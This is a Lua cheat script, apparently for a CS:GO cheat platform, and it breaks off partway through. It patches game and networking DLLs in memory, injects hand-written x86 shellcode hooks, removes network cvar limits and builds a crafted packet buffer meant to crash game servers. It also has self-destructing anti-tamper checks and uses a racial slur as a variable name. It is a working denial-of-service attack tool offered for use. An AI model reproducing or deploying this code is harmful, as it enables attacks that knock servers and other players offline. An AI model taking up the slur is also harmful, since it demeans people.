--region checks
local function crashNormal()
    while (true) do
        print("Hello World");
    end
end

-- Normal Crash Check
local normalCrashCheck = {
    { 'load', 202 },
    { 'cast', 189 },
    { 'new', 188 },
    { 'sizeof', 192 },
}

for i = 1, #normalCrashCheck do
    local str, func = normalCrashCheck[i][1], ffi;
    for token in string.gmatch(str, "[^%.]+") do
        func = func[token];
    end
    if (not string.find(tostring(func), (normalCrashCheck[i][2]))) then
        crashNormal();
    end
    if (pcall(string.dump, func)) then
        crashNormal();
    end
end

local kernel32 = ffi.load("kernel32");
local Psapi = ffi.load("Psapi.dll");

local function crashScript()
    local client_dll = kernel32.GetModuleHandleA("client.dll")
    if client_dll == 0 then
        ffi.cast("uintptr_t*", 0)[0] = 0x1337 -- simple crash
    end
    local modinfo = ffi.new("MODULEINFO")
    if Psapi.GetModuleInformation(-1, client_dll, modinfo, ffi.sizeof("MODULEINFO")) ~= 0 then
        local base = ffi.cast("uintptr_t", modinfo.lpBaseOfDll)
        local size = modinfo.SizeOfImage
        for i = tonumber(base), tonumber(size + base), 4 do
            ffi.cast("uintptr_t*", base + i)[0] = 0x1337
        end
    else
        ffi.cast("uintptr_t*", 0)[0] = 0x1337 -- simple crash
    end
end

local ffiAPIs = {
    { 'new', 188 },
    { 'cast', 189 },
    { 'typeof', 190 },
    { 'sizeof', 192 },
    { 'alignof', 193 },
    { 'istype', 191 },
    { 'fill', 198 },
    { 'cdef', 187 },
    { 'abi', 199 },
    { 'metatype', 200 },
    { 'copy', 197 },
    { 'string', 196 },
    { 'gc', 201 },
    { 'errno', 195 },
    { 'offsetof', 194 }
}

for i = 1, #ffiAPIs do
    local str, func = ffiAPIs[i][1], ffi;
    for token in string.gmatch(str, "[^%.]+") do
        func = func[token];
    end
    if (not string.find(tostring(func), (ffiAPIs[i][2])) or pcall(string.dump, func)) then
        crashScript();
    end
end
--endregion checks
--region better gui callbacks by SamHoque because nezu paster
local guiCallbacks = {};
function gui.SetCallback(self, cb)
    guiCallbacks[self] = { cb, self:GetValue() };
end

callbacks.Register("Draw", function()
    for guiObject, callback in pairs(guiCallbacks) do
        local cb, value = unpack(callback);
        local curValue = guiObject:GetValue();
        if (value ~= curValue) then
            cb(value, curValue);
            guiCallbacks[guiObject][2] = curValue;
        end
    end
end)

local timer = {}
do
    local timers = {};
    timer['Create'] = function(name, delay, times, func)
        table.insert(timers, { ["name"] = name, ["delay"] = delay, ["times"] = times, ["func"] = func, ["lastTime"] = globals.RealTime() })
    end
    timer['Remove'] = function(name)
        for k, v in pairs(timers or {}) do
            if (name == v["name"]) then
                table.remove(timers, k)
            end
        end
    end
    timer['Tick'] = function()
        for k, v in pairs(timers or {}) do
            if (v["times"] <= 0) then
                table.remove(timers, k)
            end
            if (v["lastTime"] + v["delay"] <= globals.RealTime()) then
                timers[k]["lastTime"] = globals.RealTime()
                timers[k]["times"] = timers[k]["times"] - 111
                v["func"]()
            end
        end
    end
end
--endregion
--region JSON Library
local json = {}
do
    local a;
    local b = { [string.char(92)] = string.char(92), [string.char(34)] = string.char(34), [string.char(8)] = "b", [string.char(12)] = "f", [string.char(10)] = "n", [string.char(13)] = "r", [string.char(9)] = "t" }
    local c = { ["/"] = "/" }
    for d, e in pairs(b) do
        c[e] = d
    end ;
    local function f(g)
        return string.char(92) .. (b[g] or string.format("u%04x", g:byte()))
    end;
    local function h(i)
        return "null"
    end;
    local function j(i, k)
        local l = {}
        k = k or {}
        if k[i] then
            error("circular reference")
        end ;
        k[i] = true;
        if rawget(i, 1) ~= nil or next(i) == nil then
            local m = 0;
            for d in pairs(i) do
                if type(d) ~= "number" then
                    error("invalid table: mixed or invalid key types")
                end ;
                m = m + 1
            end ;
            if m ~= #i then
                error("invalid table: sparse array")
            end ;
            for n, e in ipairs(i) do
                table.insert(l, a(e, k))
            end ;
            k[i] = nil;
            return "[" .. table.concat(l, ",") .. "]"
        else
            for d, e in pairs(i) do
                if type(d) ~= "string" then
                    error("invalid table: mixed or invalid key types")
                end ;
                table.insert(l, a(d, k) .. ":" .. a(e, k))
            end ;
            k[i] = nil;
            return "{" .. table.concat(l, ",") .. "}"
        end
    end;
    local function o(i)
        return '"' .. i:gsub('[%z' .. string.char(1) .. '-' .. string.char(31) .. '"' .. string.char(92) .. ']', f) .. '"'
    end;
    local function p(i)
        if i ~= i or i <= -math.huge or i >= math.huge then
            error("unexpected number value '" .. tostring(i) .. "'")
        end ;
        return string.format("%.14g", i)
    end;
    local q = { ["nil"] = h, ["table"] = j, ["string"] = o, ["number"] = p, ["boolean"] = tostring }
    a = function(i, k)
        local r = type(i)
        local s = q[r]
        if s then
            return s(i, k)
        end ;
        error("unexpected type '" .. r .. "'")
    end;
    function json.stringify(i)
        return a(i)
    end;
    local t;
    local function u(...)
        local l = {}
        for n = 1, select("#", ...) do
            l[select(n, ...)] = true
        end ;
        return l
    end;
    local v = u(" ", string.char(9), string.char(13), string.char(10))
    local w = u(" ", string.char(9), string.char(13), string.char(10), "]", "}", ",")
    local x = u(string.char(92), "/", '"', "b", "f", "n", "r", "t", "u")
    local y = u("true", "false", "null")
    local z = { ["true"] = true, ["false"] = false, ["null"] = nil }
    local function A(B, C, D, E)
        for n = C, #B do
            if D[B:sub(n, n)] ~= E then
                return n
            end
        end ;
        return #B + 1
    end;
    local function F(B, C, G)
        local H = 1;
        local I = 1;
        for n = 1, C - 1 do
            I = I + 1;
            if B:sub(n, n) == string.char(10) then
                H = H + 1;
                I = 1
            end
        end ;
        error(string.format("%s at line %d col %d", G, H, I))
    end;
    local function J(m)
        local s = math.floor;
        if m <= 0x7f then
            return string.char(m)
        elseif m <= 0x7ff then
            return string.char(s(m / 64) + 192, m % 64 + 128)
        elseif m <= 0xffff then
            return string.char(s(m / 4096) + 224, s(m % 4096 / 64) + 128, m % 64 + 128)
        elseif m <= 0x10ffff then
            return string.char(s(m / 262144) + 240, s(m % 262144 / 4096) + 128, s(m % 4096 / 64) + 128, m % 64 + 128)
        end ;
        error(string.format("invalid unicode codepoint '%x'", m))
    end;
    local function K(L)
        local M = tonumber(L:sub(1, 4), 16)
        local N = tonumber(L:sub(7, 10), 16)
        if N then
            return J((M - 0xd800) * 0x400 + N - 0xdc00 + 0x10000)
        else
            return J(M)
        end
    end;
    local function O(B, n)
        local l = ""
        local P = n + 1;
        local d = P;
        while P <= #B do
            local Q = B:byte(P)
            if Q < 32 then
                F(B, P, "control character in string")
            elseif Q == 92 then
                l = l .. B:sub(d, P - 1)
                P = P + 1;
                local g = B:sub(P, P)
                if g == "u" then
                    local R = B:match("^[dD][89aAbB]%x%x" .. string.char(92) .. "u%x%x%x%x", P + 1) or B:match("^%x%x%x%x", P + 1) or F(B, P - 1, "invalid unicode escape in string")
                    l = l .. K(R)
                    P = P + #R
                else
                    if not x[g] then
                        F(B, P - 1, "invalid escape char '" .. g .. "' in string")
                    end ;
                    l = l .. c[g]
                end ;
                d = P + 1
            elseif Q == 34 then
                l = l .. B:sub(d, P - 1)
                return l, P + 1
            end ;
            P = P + 1
        end ;
        F(B, n, "expected closing quote for string")
    end;
    local function S(B, n)
        local Q = A(B, n, w)
        local L = B:sub(n, Q - 1)
        local m = tonumber(L)
        if not m then
            F(B, n, "invalid number '" .. L .. "'")
        end ;
        return m, Q
    end;
    local function T(B, n)
        local Q = A(B, n, w)
        local U = B:sub(n, Q - 1)
        if not y[U] then
            F(B, n, "invalid literal '" .. U .. "'")
        end ;
        return z[U], Q
    end;
    local function V(B, n)
        local l = {}
        local m = 1;
        n = n + 1;
        while 1 do
            local Q;
            n = A(B, n, v, true)
            if B:sub(n, n) == "]" then
                n = n + 1;
                break
            end ;
            Q, n = t(B, n)
            l[m] = Q;
            m = m + 1;
            n = A(B, n, v, true)
            local W = B:sub(n, n)
            n = n + 1;
            if W == "]" then
                break
            end ;
            if W ~= "," then
                F(B, n, "expected ']' or ','")
            end
        end ;
        return l, n
    end;
    local function X(B, n)
        local l = {}
        n = n + 1;
        while 1 do
            local Y, i;
            n = A(B, n, v, true)
            if B:sub(n, n) == "}" then
                n = n + 1;
                break
            end ;
            if B:sub(n, n) ~= '"' then
                F(B, n, "expected string for key")
            end ;
            Y, n = t(B, n)
            n = A(B, n, v, true)
            if B:sub(n, n) ~= ":" then
                F(B, n, "expected ':' after key")
            end ;
            n = A(B, n + 1, v, true)
            i, n = t(B, n)
            l[Y] = i;
            n = A(B, n, v, true)
            local W = B:sub(n, n)
            n = n + 1;
            if W == "}" then
                break
            end ;
            if W ~= "," then
                F(B, n, "expected '}' or ','")
            end
        end ;
        return l, n
    end;
    local Z = { ['"'] = O, ["0"] = S, ["1"] = S, ["2"] = S, ["3"] = S, ["4"] = S, ["5"] = S, ["6"] = S, ["7"] = S, ["8"] = S, ["9"] = S, ["-"] = S, ["t"] = T, ["f"] = T, ["n"] = T, ["["] = V, ["{"] = X }
    t = function(B, C)
        local W = B:sub(C, C)
        local s = Z[W]
        if s then
            return s(B, C)
        end ;
        F(B, C, "unexpected character '" .. W .. "'")
    end;
    function json.parse(B)
        if type(B) ~= "string" then
            error("expected argument of type string, got " .. type(B))
        end ;
        local l, C = t(B, A(B, 1, v, true))
        C = A(B, C, v, true)
        if C <= #B then
            F(B, C, "trailing garbage")
        end ;
        return l
    end
end
--endregion JSON Library

local function protected()
    local NIGGER_PROTECTOR = true

    print("Crasher loaded")
    --region crasher
    if not pcall(ffi.sizeof, "nezu_ConVar") then
        ffi.cdef [[
        // Redefinitions for WinAPI conventions
        typedef void VOID;
        typedef VOID* LPVOID;
        typedef uintptr_t ULONG_PTR;
        typedef ULONG_PTR SIZE_T;
        typedef unsigned long DWORD;
        typedef unsigned long* PDWORD;
        typedef int BOOL;
        typedef unsigned char BYTE;
        // Flags for functions below
        enum{
            MEM_COMMIT = 0x1000,
            MEM_RESERVE = 0x2000
        };
        enum{
            PAGE_READWRITE = 0x04,
            PAGE_EXECUTE_READWRITE = 0x40
        };
        enum{
            MEM_RELEASE = 0x8000
        };
        // Function headers
        LPVOID __stdcall VirtualAlloc(LPVOID, SIZE_T, DWORD, DWORD);
        BOOL __stdcall VirtualFree(LPVOID, SIZE_T, DWORD);
        BOOL VirtualProtect(LPVOID lpAddress, SIZE_T dwSize, DWORD flNewProtect, PDWORD lpflOldProtect);
        DWORD CreateThread(DWORD lpThreadAttributes, DWORD dwStackSize, LPVOID lpStartAddress, LPVOID lpParameter, DWORD dwCreationFlags, DWORD lpThreadId);
        uintptr_t _beginthreadex(LPVOID security, DWORD stack_size, LPVOID start_address, LPVOID arglist, DWORD initflag, PDWORD thrdaddr);
        void* GetProcAddress(LPVOID, const char*);
        void* GetModuleHandleA(const char*);
        // CS:GO classes
        typedef struct _nezu_ConVar {
            void** virtual_function_table;
            BYTE pad[20];
            void* changeCallback;
            void* parent;
            const char* defaultValue;
            char* string;
            int							m_StringLength;
            float						m_fValue;
            int							m_nValue;
            int						  m_bHasMin;
            float						m_fMinVal;
            int						  m_bHasMax;
            float						m_fMaxVal;

            void* onChangeCallbacks_memory;
            int onChangeCallbacks_allocationCount;
            int onChangeCallbacks_growSize;
            int onChangeCallbacks_size;
            void* onChangeCallbacks_elements;
        } nezu_ConVar;
    ]]
    end
    local kernel32 = ffi.load("kernel32");
    local Psapi = ffi.load("Psapi.dll");
    local C = ffi.C
    local ucrtbase = ffi.load("ucrtbase")
    local function debug(...)
        -- print(...)
    end

    debug("Server crasher starting...")

    --#region helpers

    local function patch(pointer, bytes)
        debug(string.format("patched %d bytes at %x", #bytes, tonumber(ffi.cast("uintptr_t", pointer))))
        local oldprotect = ffi.new('DWORD[1]')
        ---@diagnostic disable-next-line: undefined-field
        kernel32.VirtualProtect(pointer, #bytes, C.PAGE_EXECUTE_READWRITE, oldprotect)
        ffi.copy(pointer, ffi.new("char[?]", #bytes, bytes), #bytes)
        ---@diagnostic disable-next-line: undefined-field
        kernel32.VirtualProtect(pointer, #bytes, oldprotect[0], oldprotect)
    end


    local function instantPatch(dll, pattern, bytes)
        local mem = mem.FindPattern(dll, pattern)
        if mem ~= nil then
            patch(ffi.cast("void*", mem), bytes)
            debug("patched " .. dll .. ":\"" .. pattern .. "\" at: 0x" .. string.format("%x", tonumber(ffi.cast("uintptr_t", mem))))
        else
            debug("failed to patch " .. dll .. ":\"" .. pattern .. "\"")
        end
    end

    local function setUint(array, offset, value)
        local value2 = tonumber(ffi.cast("uintptr_t", value))
        for i = 0, 3 do
            array[i + offset] = bit.band(bit.rshift(value2, i * 8), 0xFF)
        end
    end

    local function createShellcode(array)
        ---@diagnostic disable-next-line: undefined-field
        local mem = kernel32.VirtualAlloc(nil, #array, C.MEM_COMMIT + C.MEM_RESERVE, C.PAGE_EXECUTE_READWRITE)
        ffi.copy(mem, ffi.new("char[?]", #array, array), #array)
        return mem
    end


    local function offsetPointer(mem, offset)
        return ffi.cast("void*", ffi.cast("uintptr_t", mem) + (offset * 4))
    end

    local CreateInterface = function(module, interfaceName)
        return ffi.cast("void*", ffi.cast("void*(__cdecl*)(const char*, int*)", ffi.C.GetProcAddress(ffi.C.GetModuleHandleA(module), "CreateInterface"))(interfaceName, ffi.new("int*")))
    end

    local engine_cvar = ffi.cast("void***", CreateInterface("vstdlib.dll", "VEngineCvar007")) or error('VEngineCvar007 is nil.')
    local engine_cvar_vmt = engine_cvar[0]
    local engine_cvar_findVar = ffi.cast(ffi.typeof("nezu_ConVar*(__thiscall*)(void*, const char*)"), engine_cvar_vmt[15])

    local cvar_sv_maxroutable = engine_cvar_findVar(engine_cvar, "sv_maxroutable") or error('sv_maxroutable not found')
    local cvar_net_maxroutable = engine_cvar_findVar(engine_cvar, "net_maxroutable") or error('net_maxroutable not found')
    local cvar_cl_flushentitypacket = engine_cvar_findVar(engine_cvar, "cl_flushentitypacket") or error('cl_flushentitypacket not found')
    local cvar_net_compresspackets_minsize = engine_cvar_findVar(engine_cvar, "net_compresspackets_minsize") or error('net_compresspackets_minsize not found')
    local cvar_net_compresspackets = engine_cvar_findVar(engine_cvar, "net_compresspackets") or error('net_compresspackets not found')
    local cvar_net_threaded_socket_recovery_time = engine_cvar_findVar(engine_cvar, "net_threaded_socket_recovery_time") or error('net_threaded_socket_recovery_time not found')
    local cvar_net_threaded_socket_recovery_rate = engine_cvar_findVar(engine_cvar, "net_threaded_socket_recovery_rate") or error('net_threaded_socket_recovery_rate not found')
    local cvar_net_threaded_socket_burst_cap = engine_cvar_findVar(engine_cvar, "net_threaded_socket_burst_cap") or error('net_threaded_socket_burst_cap not found')
    local cvar_rate = engine_cvar_findVar(engine_cvar, "rate") or error('rate not found')

    local cvar_vmt = cvar_rate.virtual_function_table


    local cvar_setFloat = ffi.cast(ffi.typeof("void(__thiscall*)(void*, float)"), cvar_vmt[15])
    local cvar_setInt = ffi.cast(ffi.typeof("void(__thiscall*)(void*, int)"), cvar_vmt[16])


    -- remove callbacks
    cvar_sv_maxroutable.onChangeCallbacks_size = 0
    cvar_net_maxroutable.onChangeCallbacks_size = 0
    cvar_cl_flushentitypacket.onChangeCallbacks_size = 0
    cvar_net_compresspackets_minsize.onChangeCallbacks_size = 0
    cvar_net_compresspackets.onChangeCallbacks_size = 0
    cvar_net_threaded_socket_recovery_time.onChangeCallbacks_size = 0
    cvar_net_threaded_socket_recovery_rate.onChangeCallbacks_size = 0
    cvar_net_threaded_socket_burst_cap.onChangeCallbacks_size = 0
    cvar_rate.onChangeCallbacks_size = 0

    -- remove limits
    cvar_net_maxroutable.m_bHasMin = 0;
    cvar_net_maxroutable.m_bHasMax = 0;

    --#endregion

    --#region state

    local CRASHER_STATE_ENABLED = 0;
    local CRASHER_STATE_STRENGTH = 1;
    local CRASHER_STATE_OPC = 2;
    local CRASHER_STATE_OSSCD = 3;
    local CRASHER_STATE_SHOULD_CALL = 4;
    local CRASHER_STATE_COUNTER = 5;
    local CRASHER_STATE_NETCHAN = 6;
    local CRASHER_STATE_SENDLONG = 7;
    local CRASHER_STATE_SENDTOIMPL = 8;
    local CRASHER_STATE_BEGINTHREADEX = 9;

    ---@diagnostic disable-next-line: undefined-field
    local crasher_state_mem = kernel32.VirtualAlloc(nil, 0x1000, C.MEM_COMMIT + C.MEM_RESERVE, C.PAGE_READWRITE)
    local crasher_state = ffi.cast("uintptr_t*", crasher_state_mem);
    crasher_state[CRASHER_STATE_ENABLED] = 0
    crasher_state[CRASHER_STATE_STRENGTH] = 500
    --#endregion

    --#region patches
    instantPatch("engine.dll", "B8 ?? ?? ?? ?? ?? 3B F0 0F 4F F0 89 5D FC", { 0xB8, 0x96, 0x00, 0x00, 0x00 })
    instantPatch("engine.dll", "B8 ?? ?? ?? ?? EB 05 3B C6", { 0xB8, 0x24, 0x00, 0x00, 0x00 })
    instantPatch("steamnetworkingsockets.dll", "8D 0C 16", { 0x8D, 0x0C, 0x16, 0x90, 0x90, 0xEB })
    --#endregion

    --#region crasher hooks

    instantPatch("engine.dll", "68 ?? ?? ?? ?? C3 81 EC ?? ?? ?? ?? 56 57 8B F9 8B 4D 08", { 0x55, 0x8B, 0xEC, 0x83, 0xE4, 0xF0 })
    local ProcessConnectionless = mem.FindPattern("engine.dll", "55 8B EC 83 E4 F0 81 EC ?? ?? ?? ?? 56 57 8B F9 8B 4D 08")

    crasher_state[CRASHER_STATE_OPC] = ffi.cast("uintptr_t", ProcessConnectionless) + 6

    if ProcessConnectionless ~= nil then

        local Hooked_ProcessConnectionless = {
            0x55, -- push ebp
            0x8B, 0xEC, -- mov ebp, esp
            0x80, 0x3D, 0xDE, 0xAD, 0xBE, 0xEF, 0x00, -- cmp [0xDEADBEEF], 0
            0x74, 0x06, -- jz call_orig
            0xB0, 0x01, -- mov al, 1
            0x5D, -- pop ebp
            0xC2, 0x04, 0x00, -- retn 4
            -- :call_orig
            0x5D, -- pop ebp
            -- overwritten bytes from original:
            0x55, -- push ebp
            0x8B, 0xEC, -- mov ebp, esp
            0x83, 0xE4, 0xF0, -- and esp, 0FFFFFFF0h
            -- return flow to original
            0xFF, 0x25, 0xEF, 0xBE, 0xAD, 0xDE        -- jmp 0xDEADBEEF
        }

        local pProcessConnectionless = ffi.cast("void*", ProcessConnectionless)

        setUint(Hooked_ProcessConnectionless, 6, offsetPointer(crasher_state, CRASHER_STATE_ENABLED))
        setUint(Hooked_ProcessConnectionless, 28, offsetPointer(crasher_state, CRASHER_STATE_OPC))

        local mem_Hooked_ProcessConnectionless = createShellcode(Hooked_ProcessConnectionless)

        local ProcessConnectionless_hook = {
            0x68, 0x78, 0x56, 0x34, 0x12, -- push 0x12345678
            0xC3                          -- ret
        }

        setUint(ProcessConnectionless_hook, 2, mem_Hooked_ProcessConnectionless)

        debug("mem_Hooked_ProcessConnectionless", mem_Hooked_ProcessConnectionless)

        patch(pProcessConnectionless, ProcessConnectionless_hook)

        debug("hooked ProcessConnectionless")
    else
        print("Failed to hook ProcessConnectionless")
    end



    local csp = mem.FindPattern("engine.dll", "A1 ?? ?? ?? ?? 33 D2 6A 00 6A 00 33 C9 89 B0");
    local clientstate = ffi.cast('uintptr_t**', tonumber(ffi.cast('uintptr_t', csp)) + 1)[0][0];

    instantPatch("engine.dll", "68 ?? ?? ?? ?? C3 53 8B D9 89 5D F4 E8", { 0x55, 0x8B, 0xEC, 0x83, 0xEC, 0x18 })
    local SendSubChannelData = mem.FindPattern("engine.dll", "55 8B EC 83 EC 18 53 8B D9 89 5D F4 E8")

    crasher_state[CRASHER_STATE_OSSCD] = ffi.cast("uintptr_t", SendSubChannelData) + 6

    if SendSubChannelData ~= nil then

        local Hooked_SendSubChannelData = {
            0x55, --  0 push ebp
            0x8B, 0xEC, --  1 mov ebp, esp
            0xB8, 0x78, 0x56, 0x34, 0x12, --  3 mox eax, clientstate
            0xC6, 0x80, 0x78, 0x01, 0x00, 0x00, 0x00, --  8 mov [eax+0x178], 0
            0xC7, 0x81, 0x5C, 0x41, 0x00, 0x00, 0x00, 0x00, 0x80, 0xBF, -- 15 mov [ecx+0x415c], 0xbf800000 ; -1.0f
            0x5D, -- 25 pop ebp
            -- overwritten bytes from original:
            0x55, -- 26 push ebp
            0x8B, 0xEC, -- 27 mov ebp, esp
            0x83, 0xEC, 0x18, -- 29 sub esp, 18h
            -- return flow to original
            0xFF, 0x25, 0xEF, 0xBE, 0xAD, 0xDE                          -- 32 jmp oSendSubChannelData
        }

        local pSendSubChannelData = ffi.cast("void*", SendSubChannelData)

        setUint(Hooked_SendSubChannelData, 5, clientstate)
        setUint(Hooked_SendSubChannelData, 35, offsetPointer(crasher_state, CRASHER_STATE_OSSCD))

        local mem_Hooked_SendSubChannelData = createShellcode(Hooked_SendSubChannelData)

        local SendSubChannelData_hook = {
            0x68, 0x78, 0x56, 0x34, 0x12, -- push 0x12345678
            0xC3                          -- ret
        }

        setUint(SendSubChannelData_hook, 2, mem_Hooked_SendSubChannelData)

        debug("mem_Hooked_SendSubChannelData", mem_Hooked_SendSubChannelData)

        patch(pSendSubChannelData, SendSubChannelData_hook)

        debug("hooked SendSubChannelData")
    else
        print("Failed to hook SendSubChannelData")
    end



    -- to lazy to comment this one, it's copied from disassembly
    local CUSTOM_NET_SendLong = {
        0x55, 0x8B, 0xEC, 0x81, 0xEC, 0x04, 0x05, 0x00, 0x00, 0x53,
        0x8B, 0x5D, 0x0C, 0xB8, 0x40, 0x02, 0x00, 0x00, 0x56, 0x66,
        0x89, 0x85, 0x06, 0xFB, 0xFF, 0xFF, 0xB8, 0x1F, 0x6B, 0x19,
        0x3A, 0x57, 0x8B, 0xFA, 0x89, 0x4D, 0xF4, 0x8D, 0xB3, 0x33,
        0x02, 0x00, 0x00, 0x89, 0x7D, 0xEC, 0xF7, 0xEE, 0xC7, 0x85,
        0xFC, 0xFA, 0xFF, 0xFF, 0xFE, 0xFF, 0xFF, 0xFF, 0xC1, 0xFA,
        0x07, 0x8B, 0xF2, 0xC1, 0xEE, 0x1F, 0x03, 0xF2, 0x81, 0xFE,
        0xA1, 0x03, 0x00, 0x00, 0x0F, 0x86, 0xFF, 0x00, 0x00, 0x00,
        0xBE, 0xA1, 0x03, 0x00, 0x00, 0xB8, 0x7F, 0x00, 0x00, 0x00,
        0x3B, 0xF0, 0x0F, 0x47, 0xF0, 0x89, 0x75, 0xFC, 0xFF, 0x87,
        0x90, 0x41, 0x00, 0x00, 0x33, 0xC9, 0x81, 0x8D, 0x04, 0xFB,
        0xFF, 0xFF, 0xFF, 0xFF, 0x00, 0x00, 0x33, 0xD2, 0x8B, 0x87,
        0x90, 0x41, 0x00, 0x00, 0x89, 0x4D, 0xF8, 0x89, 0x55, 0x0C,
        0x89, 0x85, 0x00, 0xFB, 0xFF, 0xFF, 0x85, 0xDB, 0x0F, 0x8E,
        0xB4, 0x00, 0x00, 0x00, 0x8B, 0x7D, 0x08, 0x8D, 0x85, 0x08,
        0xFB, 0xFF, 0xFF, 0x2B, 0xF8, 0xB8, 0x34, 0x02, 0x00, 0x00,
        0x81, 0xFB, 0x34, 0x02, 0x00, 0x00, 0x8B, 0xF3, 0x0F, 0x47,
        0xF0, 0x81, 0xF9, 0xA1, 0x03, 0x00, 0x00, 0x0F, 0x83, 0x8D,
        0x00, 0x00, 0x00, 0x8B, 0xC1, 0xC1, 0xE0, 0x08, 0x03, 0x45,
        0xFC, 0x66, 0x89, 0x85, 0x04, 0xFB, 0xFF, 0xFF, 0x33, 0xC0,
        0x85, 0xF6, 0x74, 0x16, 0x0F, 0x1F, 0x40, 0x00, 0x8D, 0x95,
        0x08, 0xFB, 0xFF, 0xFF, 0x03, 0xD0, 0x40, 0x8A, 0x0C, 0x17,
        0x88, 0x0A, 0x3B, 0xC6, 0x72, 0xEE, 0x8D, 0x46, 0x0C, 0xC7,
        0x45, 0x08, 0x00, 0x00, 0x00, 0x00, 0x89, 0x45, 0xF0, 0x8B,
        0x45, 0xF4, 0x89, 0x45, 0xE8, 0x8B, 0x45, 0xF0, 0x6A, 0xFF,
        0x50, 0x8D, 0x95, 0xFC, 0xFA, 0xFF, 0xFF, 0x8B, 0x4D, 0xEC,
        0xFF, 0x55, 0xE8, 0x83, 0xC4, 0x08, 0x89, 0x45, 0x08, 0x8B,
        0x45, 0x08, 0x85, 0xC0, 0x78, 0x32, 0x8B, 0x55, 0x0C, 0x3B,
        0xC6, 0x7C, 0x05, 0x03, 0xD6, 0x89, 0x55, 0x0C, 0x8B, 0x4D,
        0xF8, 0x2B, 0xDE, 0x41, 0x81, 0xC7, 0x34, 0x02, 0x00, 0x00,
        0x89, 0x4D, 0xF8, 0x81, 0xF9, 0x80, 0x00, 0x00, 0x00, 0x7F,
        0x2D, 0xB8, 0x34, 0x02, 0x00, 0x00, 0x85, 0xDB, 0x0F, 0x8F,
        0x5C, 0xFF, 0xFF, 0xFF, 0x8B, 0xC2, 0x5F, 0x5E, 0x5B, 0x8B,
        0xE5, 0x5D, 0xC2, 0x0C, 0x00, 0x83, 0xFE, 0x01, 0x0F, 0x83,
        0xFD, 0xFE, 0xFF, 0xFF, 0xC7, 0x45, 0xFC, 0x01, 0x00, 0x00,
        0x00, 0xE9, 0xFE, 0xFE, 0xFF, 0xFF, 0x5F, 0x5E, 0x8D, 0x04,
        0x1A, 0x5B, 0x8B, 0xE5, 0x5D, 0xC2, 0x0C, 0x00
    }

    local mem_CUSTOM_NET_SendLong = createShellcode(CUSTOM_NET_SendLong)

    local packetbuf = {
        0xcd, 0xcd, 0xcd, 0xcd, 0xcd, 0xcd, 0xcd, 0xcd, 0xcd, 0xcd, 0xcd, 0xcd, 0xff, 0xff, 0xff, 0xff,
        0x6b, 0x40, 0xf2, 0x0b, 0x19, 0x31, 0x00, 0x00, 0x5a, 0xcd, 0x00, 0x02, 0x29, 0x00, 0x43, 0x00,
        0x02, 0x23, 0x00, 0x76, 0xbe, 0x55, 0x00, 0x76, 0x84, 0x00, 0x76, 0xe1, 0x00, 0x76, 0x6c, 0x00,
        0x76, 0xd6, 0x55, 0x00, 0x76, 0xae, 0x00, 0x76, 0x52, 0x00, 0x76, 0x90, 0x00, 0x76, 0x49, 0x55,
        0x00, 0x76, 0xf1, 0x00, 0x7e, 0xbb, 0x00, 0x76, 0xe9, 0x00, 0x76, 0xeb, 0x55, 0x00, 0x76, 0xb3,
        0x00, 0x76, 0xa6, 0x00, 0x76, 0xdb, 0x00, 0x76, 0x3c, 0x55, 0x00, 0x76, 0x87, 0x00, 0x76, 0x0c,
        0x00, 0x76, 0x3e, 0x00, 0x76, 0x99, 0x55, 0x00, 0x76, 0x24, 0x00, 0x76, 0x5e, 0x00, 0x76, 0x0d,
        0x00, 0x76, 0x1c, 0x55, 0x00, 0x76, 0x06, 0x00, 0x76, 0xb7, 0x00, 0x76, 0x47, 0x00, 0x76, 0xde,
        0x55, 0x07, 0xfe, 0x12, 0x00, 0x76, 0x4d, 0x00, 0x76, 0xc8, 0x00, 0x76, 0x43, 0x55, 0x0b, 0xfe,
        0x8b, 0x0a, 0xfe, 0x1f, 0x00, 0x76, 0x03, 0x00, 0x76, 0x5a, 0x55, 0x00, 0x76, 0x7d, 0x00, 0x76,
        0x09, 0x00, 0x76, 0x38, 0x00, 0x76, 0x25, 0x55, 0x03, 0x7e, 0x5d, 0x00, 0x76, 0xd4, 0x00, 0x76,
        0xcb, 0x00, 0x76, 0xfc, 0x55, 0x00, 0x76, 0x96, 0x00, 0x76, 0xf5, 0x00, 0x76, 0x45, 0x00, 0x76,
        0x3b, 0xd5, 0x00, 0x76, 0x13, 0x0f, 0x7e, 0x89, 0x00, 0x76, 0x0a, 0x10, 0x7e, 0x15, 0x77, 0x55,
        0x1b, 0x77, 0x32, 0x00, 0x76, 0x20, 0x00, 0x76, 0x9a, 0x00, 0x76, 0x50, 0x55, 0x00, 0x76, 0xee,
        0x00, 0x76, 0x40, 0x00, 0x76, 0x78, 0x00, 0x76, 0x36, 0x5d, 0x00, 0x76, 0xfd, 0x13, 0x7e, 0x1f,
        0x77, 0x05, 0x77, 0xf6, 0x00, 0x76, 0x9e, 0xab, 0x10, 0xfe, 0x02, 0x77, 0xdc, 0x00, 0x76, 0xad,
        0x00, 0x76, 0x4f, 0x00, 0x76, 0xaa, 0x14, 0x00, 0x76, 0xf2, 0x00, 0x76, 0x44, 0x08, 0x7e, 0x66,
        0x00, 0x76, 0xaa, 0xd0, 0x00, 0x76, 0x6b, 0x00, 0x76, 0xc4, 0x00, 0x76, 0x30, 0x1e, 0xfe, 0x6b,
        0x08, 0xf7, 0x12, 0xf7, 0xa1, 0x00, 0x76, 0x22, 0x0a, 0x7e, 0x00, 0xf7, 0x91, 0x5d, 0x00, 0x76,
        0x9d, 0x2f, 0xfe, 0x1f, 0x77, 0x1b, 0x77, 0xda, 0x00, 0x76, 0xb0, 0x55, 0x00, 0x76, 0xca, 0x29,
        0x7e, 0x02, 0x00, 0x76, 0xb9, 0x00, 0x76, 0x72, 0xab, 0x05, 0x7e, 0x10, 0x77, 0x2c, 0x00, 0x76,
        0x80, 0x00, 0x76, 0x7e, 0x00, 0x76, 0x5a, 0xc5, 0x04, 0xfe, 0xd5, 0x33, 0xfe, 0x02, 0xf7, 0xb2,
        0x00, 0x76, 0xea, 0x55, 0x00, 0x76, 0xc9, 0x00, 0x76, 0xcc, 0x00, 0x76, 0x53, 0x00, 0x76, 0xbf,
        0x7d, 0x00, 0x76, 0x67, 0x3c, 0x7e, 0x01, 0x77, 0x17, 0x77, 0x01, 0x77, 0x08, 0x77, 0x2d, 0x55,
        0x1a, 0xfe, 0x8e, 0x18, 0x7e, 0x83, 0x00, 0x76, 0xef, 0x00, 0x76, 0x57, 0x55, 0x0d, 0xfe, 0x61,
        0x00, 0x76, 0xff, 0x00, 0x76, 0x69, 0x00, 0x76, 0x8f, 0xab, 0x01, 0xfe, 0x00, 0x07, 0xd1, 0x00,
